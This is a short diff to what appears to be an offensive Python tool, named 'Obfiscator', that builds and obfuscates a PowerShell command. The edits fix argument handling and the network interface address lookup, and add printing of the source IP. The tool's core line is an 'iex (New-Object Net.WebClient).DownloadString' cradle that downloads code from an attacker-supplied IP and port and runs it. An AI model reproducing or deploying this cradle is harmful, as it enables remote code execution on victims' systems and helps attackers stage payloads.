@@ -85,7 +85,7 @@ class Obfiscator:
     def downloader(self):
         # Download String Directly
         # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload')
-        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s')" % (self.src_ip, self.src_port, self.payload)
+        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')" % (self.src_ip, self.src_port)
         self.command = self.packager(text)
 
     def return_command(self):
@@ -155,7 +155,7 @@ def main():
         parser.print_help()
         sys.exit(1)
 
-    if (args.payload == None):
+    if (args.payload == None and not args.downloader):
         parser.print_help()
         sys.exit(1)
 
@@ -181,7 +181,7 @@ def main():
     network_ifaces = get_networks(gateways)
     if src_ip == None:
         try:
-           src_ip = network_ifaces[interface]
+           src_ip = network_ifaces[interface]['addr']
         except Exception as e:
             print("[!] No IP address found on interface %s") % (interface)
 
@@ -201,5 +201,6 @@ def main():
     x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
     print(instructions)
     print(x.return_command())
+    print(src_ip)
 if __name__ == '__main__':
     main()
